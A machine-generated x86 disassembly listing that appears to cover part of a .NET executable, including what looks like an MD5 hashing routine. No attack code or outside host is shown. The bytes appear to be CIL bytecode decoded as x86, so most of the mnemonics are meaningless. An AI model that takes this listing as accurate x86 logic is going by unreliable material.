  402b7a:	00 01                	add    %al,(%ecx)
  402b7c:	46                   	inc    %esi
  402b7d:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402b80:	00 06                	add    %al,(%esi)
  402b82:	28 78 00             	sub    %bh,0x0(%eax)
  402b85:	00 06                	add    %al,(%esi)
  402b87:	02 28                	add    (%eax),%ch
  402b89:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  402b8e:	00 00                	add    %al,(%eax)
  402b90:	03 30                	add    (%eax),%esi
  402b92:	04 00                	add    $0x0,%al
  402b94:	47                   	inc    %edi
  402b95:	00 00                	add    %al,(%eax)
  402b97:	00 00                	add    %al,(%eax)
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	00 28                	add    %ch,(%eax)
  402b9d:	2c 00                	sub    $0x0,%al
  402b9f:	00 06                	add    %al,(%esi)
  402ba1:	28 7e 00             	sub    %bh,0x0(%esi)
  402ba4:	00 06                	add    %al,(%esi)
  402ba6:	28 78 00             	sub    %bh,0x0(%eax)
  402ba9:	00 06                	add    %al,(%esi)
  402bab:	1f                   	pop    %ds
  402bac:	24 8d                	and    $0x8d,%al
  402bae:	1d 00 00 01 25       	sbb    $0x25010000,%eax
  402bb3:	d0 07                	rolb   $1,(%edi)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	04 28                	add    $0x28,%al
  402bb9:	17                   	pop    %ss
  402bba:	00 00                	add    %al,(%eax)
  402bbc:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  402bc2:	20 4b 05             	and    %cl,0x5(%ebx)
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	8d 1d 00 00 01 25    	lea    0x25010000,%ebx
  402bcd:	d0 08                	rorb   $1,(%eax)
  402bcf:	00 00                	add    %al,(%eax)
  402bd1:	04 28                	add    $0x28,%al
  402bd3:	17                   	pop    %ss
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402bdc:	14 80                	adc    $0x80,%al
  402bde:	05 00 00 04 2a       	add    $0x2a040000,%eax
  402be3:	00 13                	add    %dl,(%ebx)
  402be5:	30 05 00 63 00 00    	xor    %al,0x6300
  402beb:	00 05 00 00 11 7e    	add    %al,0x7e110000
  402bf1:	09 00                	or     %eax,(%eax)
  402bf3:	00 04 20             	add    %al,(%eax,%eiz,1)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	00 02                	add    %al,(%edx)
  402bfa:	02 58 6f             	add    0x6f(%eax),%bl
  402bfd:	2e 00 00             	add    %al,%cs:(%eax)
  402c00:	0a 0a                	or     (%edx),%cl
  402c02:	06                   	push   %es
  402c03:	6f                   	outsl  %ds:(%esi),(%dx)
  402c04:	2f                   	das
  402c05:	00 00                	add    %al,(%eax)
  402c07:	0a 0b                	or     (%ebx),%cl
  402c09:	16                   	push   %ss
  402c0a:	0c 38                	or     $0x38,%al
  402c0c:	39 00                	cmp    %eax,(%eax)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	07                   	pop    %es
  402c11:	08 9a 0d 7e 09 00    	or     %bl,0x97e0d(%edx)
  402c17:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402c1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c1b:	30 00                	xor    %al,(%eax)
  402c1d:	00 0a                	add    %cl,(%edx)
  402c1f:	20 00                	and    %al,(%eax)
  402c21:	00 00                	add    %al,(%eax)
  402c23:	06                   	push   %es
  402c24:	58                   	pop    %eax
  402c25:	6f                   	outsl  %ds:(%esi),(%dx)
  402c26:	31 00                	xor    %eax,(%eax)
  402c28:	00 0a                	add    %cl,(%edx)
  402c2a:	74 35                	je     0x402c61
  402c2c:	00 00                	add    %al,(%eax)
  402c2e:	01 13                	add    %edx,(%ebx)
  402c30:	04 09                	add    $0x9,%al
  402c32:	14 06                	adc    $0x6,%al
  402c34:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c37:	32 00                	xor    (%eax),%al
  402c39:	00 0a                	add    %cl,(%edx)
  402c3b:	74 15                	je     0x402c52
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	01 6f 33             	add    %ebp,0x33(%edi)
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 08                	or     (%eax),%cl
  402c46:	17                   	pop    %ss
  402c47:	58                   	pop    %eax
  402c48:	0c 08                	or     $0x8,%al
  402c4a:	07                   	pop    %es
  402c4b:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402c4e:	be ff ff ff 2a       	mov    $0x2affffff,%esi
  402c53:	00 46 28             	add    %al,0x28(%esi)
  402c56:	2c 00                	sub    $0x0,%al
  402c58:	00 06                	add    %al,(%esi)
  402c5a:	28 78 00             	sub    %bh,0x0(%eax)
  402c5d:	00 06                	add    %al,(%esi)
  402c5f:	02 28                	add    (%eax),%ch
  402c61:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  402c66:	00 00                	add    %al,(%eax)
  402c68:	92                   	xchg   %eax,%edx
  402c69:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402c6c:	00 06                	add    %al,(%esi)
  402c6e:	28 78 00             	sub    %bh,0x0(%eax)
  402c71:	00 06                	add    %al,(%esi)
  402c73:	d0 0a                	rorb   $1,(%edx)
  402c75:	00 00                	add    %al,(%eax)
  402c77:	02 28                	add    (%eax),%ch
  402c79:	34 00                	xor    $0x0,%al
  402c7b:	00 0a                	add    %cl,(%edx)
  402c7d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7e:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402c83:	36 00 00             	add    %al,%ss:(%eax)
  402c86:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
  402c8c:	2a 00                	sub    (%eax),%al
  402c8e:	00 00                	add    %al,(%eax)
  402c90:	1b 30                	sbb    (%eax),%esi
  402c92:	04 00                	add    $0x0,%al
  402c94:	57                   	push   %edi
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 00                	add    %al,(%eax)
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	00 16                	add    %dl,(%esi)
  402c9d:	80 0a 00             	orb    $0x0,(%edx)
  402ca0:	00 04 d0             	add    %al,(%eax,%edx,8)
  402ca3:	0c 00                	or     $0x0,%al
  402ca5:	00 02                	add    %al,(%edx)
  402ca7:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402caa:	00 0a                	add    %cl,(%edx)
  402cac:	6f                   	outsl  %ds:(%esi),(%dx)
  402cad:	35 00 00 0a 80       	xor    $0x800a0000,%eax
  402cb2:	0b 00                	or     (%eax),%eax
  402cb4:	00 04 1f             	add    %al,(%edi,%ebx,1)
  402cb7:	40                   	inc    %eax
  402cb8:	8d 1e                	lea    (%esi),%ebx
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	01 25 d0 3e 00 00    	add    %esp,0x3ed0
  402cc2:	04 28                	add    $0x28,%al
  402cc4:	17                   	pop    %ss
  402cc5:	00 00                	add    %al,(%eax)
  402cc7:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  402ccd:	16                   	push   %ss
  402cce:	80 0d 00 00 04 16 80 	orb    $0x80,0x16040000
  402cd5:	0e                   	push   %cs
  402cd6:	00 00                	add    %al,(%eax)
  402cd8:	04 14                	add    $0x14,%al
  402cda:	80 0f 00             	orb    $0x0,(%edi)
  402cdd:	00 04 14             	add    %al,(%esp,%edx,1)
  402ce0:	80 10 00             	adcb   $0x0,(%eax)
  402ce3:	00 04 73             	add    %al,(%ebx,%esi,2)
  402ce6:	15 00 00 0a 80       	adc    $0x800a0000,%eax
  402ceb:	11 00                	adc    %eax,(%eax)
  402ced:	00 04 16             	add    %al,(%esi,%edx,1)
  402cf0:	80 12 00             	adcb   $0x0,(%edx)
  402cf3:	00 04 73             	add    %al,(%ebx,%esi,2)
  402cf6:	15 00 00 0a 80       	adc    $0x800a0000,%eax
  402cfb:	13 00                	adc    (%eax),%eax
  402cfd:	00 04 14             	add    %al,(%esp,%edx,1)
  402d00:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  402d04:	04 14                	add    $0x14,%al
  402d06:	80 15 00 00 04 16 8d 	adcb   $0x8d,0x16040000
  402d0d:	1d 00 00 01 80       	sbb    $0x80010000,%eax
  402d12:	16                   	push   %ss
  402d13:	00 00                	add    %al,(%eax)
  402d15:	04 16                	add    $0x16,%al
  402d17:	8d 1d 00 00 01 80    	lea    0x80010000,%ebx
  402d1d:	17                   	pop    %ss
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	04 7e                	add    $0x7e,%al
  402d22:	37                   	aaa
  402d23:	00 00                	add    %al,(%eax)
  402d25:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  402d2b:	7e 37                	jle    0x402d64
  402d2d:	00 00                	add    %al,(%eax)
  402d2f:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  402d35:	16                   	push   %ss
  402d36:	8d 09                	lea    (%ecx),%ecx
  402d38:	00 00                	add    %al,(%eax)
  402d3a:	01 80 1a 00 00 04    	add    %eax,0x400001a(%eax)
  402d40:	16                   	push   %ss
  402d41:	8d 03                	lea    (%ebx),%eax
  402d43:	00 00                	add    %al,(%eax)
  402d45:	01 80 1b 00 00 04    	add    %eax,0x400001b(%eax)
  402d4b:	17                   	pop    %ss
  402d4c:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  402d50:	04 16                	add    $0x16,%al
  402d52:	80 1d 00 00 04 73 38 	sbbb   $0x38,0x73040000
  402d59:	00 00                	add    %al,(%eax)
  402d5b:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  402d61:	16                   	push   %ss
  402d62:	80 1f 00             	sbbb   $0x0,(%edi)
  402d65:	00 04 16             	add    %al,(%esi,%edx,1)
  402d68:	6a 80                	push   $0xffffff80
  402d6a:	20 00                	and    %al,(%eax)
  402d6c:	00 04 14             	add    %al,(%esp,%edx,1)
  402d6f:	80 21 00             	andb   $0x0,(%ecx)
  402d72:	00 04 14             	add    %al,(%esp,%edx,1)
  402d75:	80 22 00             	andb   $0x0,(%edx)
  402d78:	00 04 16             	add    %al,(%esi,%edx,1)
  402d7b:	6a 80                	push   $0xffffff80
  402d7d:	23 00                	and    (%eax),%eax
  402d7f:	00 04 16             	add    %al,(%esi,%edx,1)
  402d82:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  402d86:	04 16                	add    $0x16,%al
  402d88:	80 25 00 00 04 16 80 	andb   $0x80,0x16040000
  402d8f:	26 00 00             	add    %al,%es:(%eax)
  402d92:	04 16                	add    $0x16,%al
  402d94:	80 27 00             	andb   $0x0,(%edi)
  402d97:	00 04 7e             	add    %al,(%esi,%edi,2)
  402d9a:	37                   	aaa
  402d9b:	00 00                	add    %al,(%eax)
  402d9d:	0a 80 28 00 00 04    	or     0x4000028(%eax),%al
  402da3:	16                   	push   %ss
  402da4:	80 29 00             	subb   $0x0,(%ecx)
  402da7:	00 04 73             	add    %al,(%ebx,%esi,2)
  402daa:	39 00                	cmp    %eax,(%eax)
  402dac:	00 0a                	add    %cl,(%edx)
  402dae:	80 2a 00             	subb   $0x0,(%edx)
  402db1:	00 04 14             	add    %al,(%esp,%edx,1)
  402db4:	80 2b 00             	subb   $0x0,(%ebx)
  402db7:	00 04 14             	add    %al,(%esp,%edx,1)
  402dba:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  402dbe:	04 14                	add    $0x14,%al
  402dc0:	80 2d 00 00 04 14 80 	subb   $0x80,0x14040000
  402dc7:	2e 00 00             	add    %al,%cs:(%eax)
  402dca:	04 14                	add    $0x14,%al
  402dcc:	80 2f 00             	subb   $0x0,(%edi)
  402dcf:	00 04 14             	add    %al,(%esp,%edx,1)
  402dd2:	80 30 00             	xorb   $0x0,(%eax)
  402dd5:	00 04 7e             	add    %al,(%esi,%edi,2)
  402dd8:	37                   	aaa
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	0a 80 31 00 00 04    	or     0x4000031(%eax),%al
  402de1:	17                   	pop    %ss
  402de2:	28 3a                	sub    %bh,(%edx)
  402de4:	00 00                	add    %al,(%eax)
  402de6:	0a dd                	or     %ch,%bl
  402de8:	06                   	push   %es
  402de9:	00 00                	add    %al,(%eax)
  402deb:	00 26                	add    %ah,(%esi)
  402ded:	dd 00                	fldl   (%eax)
  402def:	00 00                	add    %al,(%eax)
  402df1:	00 2a                	add    %ch,(%edx)
  402df3:	00 01                	add    %al,(%ecx)
  402df5:	10 00                	adc    %al,(%eax)
  402df7:	00 00                	add    %al,(%eax)
  402df9:	00 45 01             	add    %al,0x1(%ebp)
  402dfc:	0b 50 01             	or     0x1(%eax),%edx
  402dff:	06                   	push   %es
  402e00:	14 00                	adc    $0x0,%al
  402e02:	00 01                	add    %al,(%ecx)
  402e04:	06                   	push   %es
  402e05:	2a 00                	sub    (%eax),%al
  402e07:	00 13                	add    %dl,(%ebx)
  402e09:	30 09                	xor    %cl,(%ecx)
  402e0b:	00 57 06             	add    %dl,0x6(%edi)
  402e0e:	00 00                	add    %al,(%eax)
  402e10:	06                   	push   %es
  402e11:	00 00                	add    %al,(%eax)
  402e13:	11 1f                	adc    %ebx,(%edi)
  402e15:	10 8d 1e 00 00 01    	adc    %cl,0x100001e(%ebp)
  402e1b:	0a 20                	or     (%eax),%ah
  402e1d:	c0 01 00             	rolb   $0x0,(%ecx)
  402e20:	00 02                	add    %al,(%edx)
  402e22:	8e 69 1e             	mov    0x1e(%ecx),%gs
  402e25:	5a                   	pop    %edx
  402e26:	20 00                	and    %al,(%eax)
  402e28:	02 00                	add    (%eax),%al
  402e2a:	00 5d 59             	add    %bl,0x59(%ebp)
  402e2d:	20 00                	and    %al,(%eax)
  402e2f:	02 00                	add    (%eax),%al
  402e31:	00 58 20             	add    %bl,0x20(%eax)
  402e34:	00 02                	add    %al,(%edx)
  402e36:	00 00                	add    %al,(%eax)
  402e38:	5d                   	pop    %ebp
  402e39:	13 08                	adc    (%eax),%ecx
  402e3b:	11 08                	adc    %ecx,(%eax)
  402e3d:	3a 07                	cmp    (%edi),%al
  402e3f:	00 00                	add    %al,(%eax)
  402e41:	00 20                	add    %ah,(%eax)
  402e43:	00 02                	add    %al,(%edx)
  402e45:	00 00                	add    %al,(%eax)
  402e47:	13 08                	adc    (%eax),%ecx
  402e49:	02 8e 69 6a 11 08    	add    0x8116a69(%esi),%cl
  402e4f:	1e                   	push   %ds
  402e50:	5c                   	pop    %esp
  402e51:	6e                   	outsb  %ds:(%esi),(%dx)
  402e52:	58                   	pop    %eax
  402e53:	1e                   	push   %ds
  402e54:	6a 58                	push   $0x58
  402e56:	6d                   	insl   (%dx),%es:(%edi)
  402e57:	13 0a                	adc    (%edx),%ecx
  402e59:	02 8e 69 6a 1e 6a    	add    0x6a1e6a69(%esi),%cl
  402e5f:	5a                   	pop    %edx
  402e60:	13 09                	adc    (%ecx),%ecx
  402e62:	11 0a                	adc    %ecx,(%edx)
  402e64:	8d 1d 00 00 01 0b    	lea    0xb010000,%ebx
  402e6a:	16                   	push   %ss
  402e6b:	13 0b                	adc    (%ebx),%ecx
  402e6d:	38 0e                	cmp    %cl,(%esi)
  402e6f:	00 00                	add    %al,(%eax)
  402e71:	00 07                	add    %al,(%edi)
  402e73:	11 0b                	adc    %ecx,(%ebx)
  402e75:	02 11                	add    (%ecx),%dl
  402e77:	0b 91 9c 11 0b 17    	or     0x170b119c(%ecx),%edx
  402e7d:	58                   	pop    %eax
  402e7e:	13 0b                	adc    (%ebx),%ecx
  402e80:	11 0b                	adc    %ecx,(%ebx)
  402e82:	02 8e 69 3f e8 ff    	add    -0x17c097(%esi),%cl
  402e88:	ff                   	(bad)
  402e89:	ff 07                	incl   (%edi)
  402e8b:	02 8e 69 8f 1d 00    	add    0x1d8f69(%esi),%cl
  402e91:	00 01                	add    %al,(%ecx)
  402e93:	25 47 20 80 00       	and    $0x802047,%eax
  402e98:	00 00                	add    %al,(%eax)
  402e9a:	60                   	pusha
  402e9b:	d2 52 1e             	rclb   %cl,0x1e(%edx)
  402e9e:	13 0c 38             	adc    (%eax,%edi,1),%ecx
  402ea1:	24 00                	and    $0x0,%al
  402ea3:	00 00                	add    %al,(%eax)
  402ea5:	07                   	pop    %es
  402ea6:	11 0a                	adc    %ecx,(%edx)
  402ea8:	6e                   	outsb  %ds:(%esi),(%dx)
  402ea9:	11 0c 6a             	adc    %ecx,(%edx,%ebp,2)
  402eac:	59                   	pop    %ecx
  402ead:	d4 11                	aam    $0x11
  402eaf:	09 1e                	or     %ebx,(%esi)
  402eb1:	11 0c 59             	adc    %ecx,(%ecx,%ebx,2)
  402eb4:	1e                   	push   %ds
  402eb5:	5a                   	pop    %edx
  402eb6:	1f                   	pop    %ds
  402eb7:	3f                   	aas
  402eb8:	5f                   	pop    %edi
  402eb9:	64 20 ff             	fs and %bh,%bh
  402ebc:	00 00                	add    %al,(%eax)
  402ebe:	00 6a 5f             	add    %ch,0x5f(%edx)
  402ec1:	d2 9c 11 0c 17 59 13 	rcrb   %cl,0x1359170c(%ecx,%edx,1)
  402ec8:	0c 11                	or     $0x11,%al
  402eca:	0c 16                	or     $0x16,%al
  402ecc:	3d d4 ff ff ff       	cmp    $0xffffffd4,%eax
  402ed1:	07                   	pop    %es
  402ed2:	8e 69 1e             	mov    0x1e(%ecx),%gs
  402ed5:	5a                   	pop    %edx
  402ed6:	1f                   	pop    %ds
  402ed7:	20 5c 0c 20          	and    %bl,0x20(%esp,%ecx,1)
  402edb:	01 23                	add    %esp,(%ebx)
  402edd:	45                   	inc    %ebp
  402ede:	67 0d 20 89 ab cd    	addr16 or $0xcdab8920,%eax
  402ee4:	ef                   	out    %eax,(%dx)
  402ee5:	13 04 20             	adc    (%eax,%eiz,1),%eax
  402ee8:	fe                   	(bad)
  402ee9:	dc ba 98 13 05 20    	fdivrl 0x20051398(%edx)
  402eef:	76 54                	jbe    0x402f45
  402ef1:	32 10                	xor    (%eax),%dl
  402ef3:	13 06                	adc    (%esi),%eax
  402ef5:	16                   	push   %ss
  402ef6:	13 0d 38 13 05 00    	adc    0x51338,%ecx
  402efc:	00 11                	add    %dl,(%ecx)
  402efe:	0d 1c 62 13 0e       	or     $0xe13621c,%eax
  402f03:	16                   	push   %ss
  402f04:	13 13                	adc    (%ebx),%edx
  402f06:	38 39                	cmp    %bh,(%ecx)
  402f08:	00 00                	add    %al,(%eax)
  402f0a:	00 06                	add    %al,(%esi)
  402f0c:	11 13                	adc    %edx,(%ebx)
  402f0e:	18 64 07 11          	sbb    %ah,0x11(%edi,%eax,1)
  402f12:	0e                   	push   %cs
  402f13:	11 13                	adc    %edx,(%ebx)
  402f15:	19 58 58             	sbb    %ebx,0x58(%eax)
  402f18:	91                   	xchg   %eax,%ecx
  402f19:	1f                   	pop    %ds
  402f1a:	18 62 07             	sbb    %ah,0x7(%edx)
  402f1d:	11 0e                	adc    %ecx,(%esi)
  402f1f:	11 13                	adc    %edx,(%ebx)
  402f21:	18 58 58             	sbb    %bl,0x58(%eax)
  402f24:	91                   	xchg   %eax,%ecx
  402f25:	1f                   	pop    %ds
  402f26:	10 62 60             	adc    %ah,0x60(%edx)
  402f29:	07                   	pop    %es
  402f2a:	11 0e                	adc    %ecx,(%esi)
  402f2c:	11 13                	adc    %edx,(%ebx)
  402f2e:	17                   	pop    %ss
  402f2f:	58                   	pop    %eax
  402f30:	58                   	pop    %eax
  402f31:	91                   	xchg   %eax,%ecx
  402f32:	1e                   	push   %ds
  402f33:	62 60 07             	bound  %esp,0x7(%eax)
  402f36:	11 0e                	adc    %ecx,(%esi)
  402f38:	11 13                	adc    %edx,(%ebx)
  402f3a:	58                   	pop    %eax
  402f3b:	91                   	xchg   %eax,%ecx
  402f3c:	60                   	pusha
  402f3d:	9e                   	sahf
  402f3e:	11 13                	adc    %edx,(%ebx)
  402f40:	1a 58 13             	sbb    0x13(%eax),%bl
  402f43:	13 11                	adc    (%ecx),%edx
  402f45:	13 1f                	adc    (%edi),%ebx
  402f47:	3d 44 be ff ff       	cmp    $0xffffbe44,%eax
  402f4c:	ff 09                	decl   (%ecx)
  402f4e:	13 0f                	adc    (%edi),%ecx
  402f50:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  402f53:	10 11                	adc    %dl,(%ecx)
  402f55:	05 13 11 11 06       	add    $0x6111113,%eax
  402f5a:	13 12                	adc    (%edx),%edx
  402f5c:	12 03                	adc    (%ebx),%al
  402f5e:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  402f61:	05 11 06 16 1d       	add    $0x1d160611,%eax
  402f66:	17                   	pop    %ss
  402f67:	06                   	push   %es
  402f68:	28 1a                	sub    %bl,(%edx)
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	06                   	push   %es
  402f6d:	12 06                	adc    (%esi),%al
  402f6f:	09 11                	or     %edx,(%ecx)
  402f71:	04 11                	add    $0x11,%al
  402f73:	05 17 1f 0c 18       	add    $0x180c1f17,%eax
  402f78:	06                   	push   %es
  402f79:	28 1a                	sub    %bl,(%edx)
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	06                   	push   %es
  402f7e:	12 05 11 06 09 11    	adc    0x11090611,%al
  402f84:	04 18                	add    $0x18,%al
  402f86:	1f                   	pop    %ds
  402f87:	11 19                	adc    %ebx,(%ecx)
  402f89:	06                   	push   %es
  402f8a:	28 1a                	sub    %bl,(%edx)
  402f8c:	00 00                	add    %al,(%eax)
  402f8e:	06                   	push   %es
  402f8f:	12 04 11             	adc    (%ecx,%edx,1),%al
  402f92:	05 11 06 09 19       	add    $0x19090611,%eax
  402f97:	1f                   	pop    %ds
  402f98:	16                   	push   %ss
  402f99:	1a 06                	sbb    (%esi),%al
  402f9b:	28 1a                	sub    %bl,(%edx)
  402f9d:	00 00                	add    %al,(%eax)
  402f9f:	06                   	push   %es
  402fa0:	12 03                	adc    (%ebx),%al
  402fa2:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  402fa5:	05 11 06 1a 1d       	add    $0x1d1a0611,%eax
  402faa:	1b 06                	sbb    (%esi),%eax
  402fac:	28 1a                	sub    %bl,(%edx)
  402fae:	00 00                	add    %al,(%eax)
  402fb0:	06                   	push   %es
  402fb1:	12 06                	adc    (%esi),%al
  402fb3:	09 11                	or     %edx,(%ecx)
  402fb5:	04 11                	add    $0x11,%al
  402fb7:	05 1b 1f 0c 1c       	add    $0x1c0c1f1b,%eax
  402fbc:	06                   	push   %es
  402fbd:	28 1a                	sub    %bl,(%edx)
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	06                   	push   %es
  402fc2:	12 05 11 06 09 11    	adc    0x11090611,%al
  402fc8:	04 1c                	add    $0x1c,%al
  402fca:	1f                   	pop    %ds
  402fcb:	11 1d 06 28 1a 00    	adc    %ebx,0x1a2806
  402fd1:	00 06                	add    %al,(%esi)
  402fd3:	12 04 11             	adc    (%ecx,%edx,1),%al
  402fd6:	05 11 06 09 1d       	add    $0x1d090611,%eax
  402fdb:	1f                   	pop    %ds
  402fdc:	16                   	push   %ss
  402fdd:	1e                   	push   %ds
  402fde:	06                   	push   %es
  402fdf:	28 1a                	sub    %bl,(%edx)
  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	06                   	push   %es
  402fe4:	12 03                	adc    (%ebx),%al
  402fe6:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  402fe9:	05 11 06 1e 1d       	add    $0x1d1e0611,%eax
  402fee:	1f                   	pop    %ds
  402fef:	09 06                	or     %eax,(%esi)
  402ff1:	28 1a                	sub    %bl,(%edx)
  402ff3:	00 00                	add    %al,(%eax)
  402ff5:	06                   	push   %es
  402ff6:	12 06                	adc    (%esi),%al
  402ff8:	09 11                	or     %edx,(%ecx)
  402ffa:	04 11                	add    $0x11,%al
  402ffc:	05 1f 09 1f 0c       	add    $0xc1f091f,%eax
  403001:	1f                   	pop    %ds
  403002:	0a 06                	or     (%esi),%al
  403004:	28 1a                	sub    %bl,(%edx)
  403006:	00 00                	add    %al,(%eax)
  403008:	06                   	push   %es
  403009:	12 05 11 06 09 11    	adc    0x11090611,%al
  40300f:	04 1f                	add    $0x1f,%al
  403011:	0a 1f                	or     (%edi),%bl
  403013:	11 1f                	adc    %ebx,(%edi)
  403015:	0b 06                	or     (%esi),%eax
  403017:	28 1a                	sub    %bl,(%edx)
  403019:	00 00                	add    %al,(%eax)
  40301b:	06                   	push   %es
  40301c:	12 04 11             	adc    (%ecx,%edx,1),%al
  40301f:	05 11 06 09 1f       	add    $0x1f090611,%eax
  403024:	0b 1f                	or     (%edi),%ebx
  403026:	16                   	push   %ss
  403027:	1f                   	pop    %ds
  403028:	0c 06                	or     $0x6,%al
  40302a:	28 1a                	sub    %bl,(%edx)
  40302c:	00 00                	add    %al,(%eax)
  40302e:	06                   	push   %es
  40302f:	12 03                	adc    (%ebx),%al
  403031:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403034:	05 11 06 1f 0c       	add    $0xc1f0611,%eax
  403039:	1d 1f 0d 06 28       	sbb    $0x28060d1f,%eax
  40303e:	1a 00                	sbb    (%eax),%al
  403040:	00 06                	add    %al,(%esi)
  403042:	12 06                	adc    (%esi),%al
  403044:	09 11                	or     %edx,(%ecx)
  403046:	04 11                	add    $0x11,%al
  403048:	05 1f 0d 1f 0c       	add    $0xc1f0d1f,%eax
  40304d:	1f                   	pop    %ds
  40304e:	0e                   	push   %cs
  40304f:	06                   	push   %es
  403050:	28 1a                	sub    %bl,(%edx)
  403052:	00 00                	add    %al,(%eax)
  403054:	06                   	push   %es
  403055:	12 05 11 06 09 11    	adc    0x11090611,%al
  40305b:	04 1f                	add    $0x1f,%al
  40305d:	0e                   	push   %cs
  40305e:	1f                   	pop    %ds
  40305f:	11 1f                	adc    %ebx,(%edi)
  403061:	0f 06                	clts
  403063:	28 1a                	sub    %bl,(%edx)
  403065:	00 00                	add    %al,(%eax)
  403067:	06                   	push   %es
  403068:	12 04 11             	adc    (%ecx,%edx,1),%al
  40306b:	05 11 06 09 1f       	add    $0x1f090611,%eax
  403070:	0f 1f 16             	nopl   (%esi)
  403073:	1f                   	pop    %ds
  403074:	10 06                	adc    %al,(%esi)
  403076:	28 1a                	sub    %bl,(%edx)
  403078:	00 00                	add    %al,(%eax)
  40307a:	06                   	push   %es
  40307b:	12 03                	adc    (%ebx),%al
  40307d:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403080:	05 11 06 17 1b       	add    $0x1b170611,%eax
  403085:	1f                   	pop    %ds
  403086:	11 06                	adc    %eax,(%esi)
  403088:	28 1b                	sub    %bl,(%ebx)
  40308a:	00 00                	add    %al,(%eax)
  40308c:	06                   	push   %es
  40308d:	12 06                	adc    (%esi),%al
  40308f:	09 11                	or     %edx,(%ecx)
  403091:	04 11                	add    $0x11,%al
  403093:	05 1c 1f 09 1f       	add    $0x1f091f1c,%eax
  403098:	12 06                	adc    (%esi),%al
  40309a:	28 1b                	sub    %bl,(%ebx)
  40309c:	00 00                	add    %al,(%eax)
  40309e:	06                   	push   %es
  40309f:	12 05 11 06 09 11    	adc    0x11090611,%al
  4030a5:	04 1f                	add    $0x1f,%al
  4030a7:	0b 1f                	or     (%edi),%ebx
  4030a9:	0e                   	push   %cs
  4030aa:	1f                   	pop    %ds
  4030ab:	13 06                	adc    (%esi),%eax
  4030ad:	28 1b                	sub    %bl,(%ebx)
  4030af:	00 00                	add    %al,(%eax)
  4030b1:	06                   	push   %es
  4030b2:	12 04 11             	adc    (%ecx,%edx,1),%al
  4030b5:	05 11 06 09 16       	add    $0x16090611,%eax
  4030ba:	1f                   	pop    %ds
  4030bb:	14 1f                	adc    $0x1f,%al
  4030bd:	14 06                	adc    $0x6,%al
  4030bf:	28 1b                	sub    %bl,(%ebx)
  4030c1:	00 00                	add    %al,(%eax)
  4030c3:	06                   	push   %es
  4030c4:	12 03                	adc    (%ebx),%al
  4030c6:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4030c9:	05 11 06 1b 1b       	add    $0x1b1b0611,%eax
  4030ce:	1f                   	pop    %ds
  4030cf:	15 06 28 1b 00       	adc    $0x1b2806,%eax
  4030d4:	00 06                	add    %al,(%esi)
  4030d6:	12 06                	adc    (%esi),%al
  4030d8:	09 11                	or     %edx,(%ecx)
  4030da:	04 11                	add    $0x11,%al
  4030dc:	05 1f 0a 1f 09       	add    $0x91f0a1f,%eax
  4030e1:	1f                   	pop    %ds
  4030e2:	16                   	push   %ss
  4030e3:	06                   	push   %es
  4030e4:	28 1b                	sub    %bl,(%ebx)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	06                   	push   %es
  4030e9:	12 05 11 06 09 11    	adc    0x11090611,%al
  4030ef:	04 1f                	add    $0x1f,%al
  4030f1:	0f 1f 0e             	nopl   (%esi)
  4030f4:	1f                   	pop    %ds
  4030f5:	17                   	pop    %ss
  4030f6:	06                   	push   %es
  4030f7:	28 1b                	sub    %bl,(%ebx)
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	06                   	push   %es
  4030fc:	12 04 11             	adc    (%ecx,%edx,1),%al
  4030ff:	05 11 06 09 1a       	add    $0x1a090611,%eax
  403104:	1f                   	pop    %ds
  403105:	14 1f                	adc    $0x1f,%al
  403107:	18 06                	sbb    %al,(%esi)
  403109:	28 1b                	sub    %bl,(%ebx)
  40310b:	00 00                	add    %al,(%eax)
  40310d:	06                   	push   %es
  40310e:	12 03                	adc    (%ebx),%al
  403110:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403113:	05 11 06 1f 09       	add    $0x91f0611,%eax
  403118:	1b 1f                	sbb    (%edi),%ebx
  40311a:	19 06                	sbb    %eax,(%esi)
  40311c:	28 1b                	sub    %bl,(%ebx)
  40311e:	00 00                	add    %al,(%eax)
